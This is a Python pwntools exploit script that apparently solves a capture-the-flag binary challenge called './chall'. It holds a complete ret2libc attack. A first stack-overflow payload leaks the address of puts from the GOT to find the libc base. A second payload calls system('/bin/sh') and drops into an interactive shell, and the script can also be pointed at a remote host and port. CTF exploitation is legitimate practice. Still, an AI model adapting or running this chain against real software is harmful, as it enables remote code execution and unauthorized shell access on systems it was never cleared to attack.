from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
libc = elf.libc
ret = ROP(elf).find_gadget(["ret"])[0]  # For stack alignment

payload = flat(
    [
        cyclic(56),  # Padding to sus parameter
        elf.got[
            "puts"
        ],  # Set sus paremeter to GOT.puts so that the RDI register set to GOT.puts
        cyclic(8),  # Saved RBP padding
        elf.plt["puts"],
        elf.sym["main"],
    ]
)

io.sendlineafter(b"?\n", payload)

puts_leak = unpack(io.recvline()[:-1].ljust(8, b"\x00"))
info(f"GOT Puts : {hex(puts_leak)}")
libc.address = puts_leak - libc.sym["puts"]
info(f"LIBC Base : {hex(libc.address)}")

payload = flat(
    [cyclic(56), next(libc.search(b"/bin/sh\x00")), cyclic(8), ret, libc.sym["system"]]
)

io.sendline(payload)
io.interactive()
